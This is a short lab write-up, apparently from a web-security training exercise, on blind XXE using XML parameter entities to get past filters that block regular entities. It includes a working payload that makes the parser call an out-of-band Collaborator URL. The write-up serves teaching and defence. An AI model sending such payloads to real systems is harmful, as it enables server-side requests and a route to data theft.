## Lab 04: Blind XXE with Out-of-Band Interaction via XML Parameter Entities

### Context
 
Some applications implement partial XXE protection by blocking or stripping regular entity declarations. Regular entities use the `<!ENTITY name SYSTEM "...">` format and are referenced as `&name;` in the document body. XML also has a second type called parameter entities which are defined with a `%` prefix and can only be referenced inside the DTD itself. These are a separate code path in many parsers and are often missed by filters that only look for regular entity patterns.
 
### What I Did
 
Generated a Collaborator payload. Modified the XML to use a parameter entity instead of a regular entity:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-PAYLOAD.burpcollaborator.net"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
 
The `%xxe;` reference inside the DOCTYPE causes the parser to fetch and process the entity during DTD parsing, before it even gets to the document body. Sent the request, polled Collaborator.
 
DNS and HTTP interactions arrived confirming successful exploitation through parameter entities.
 
### Why It Works
 
The filter was blocking `<!ENTITY name SYSTEM ...>` declarations or the `&name;` reference pattern in the document body. Parameter entities have different syntax and are processed at a different stage. The application's filter did not account for them. The parser resolved the entity during DTD processing and the network request went out before anything in the body was even evaluated.
 
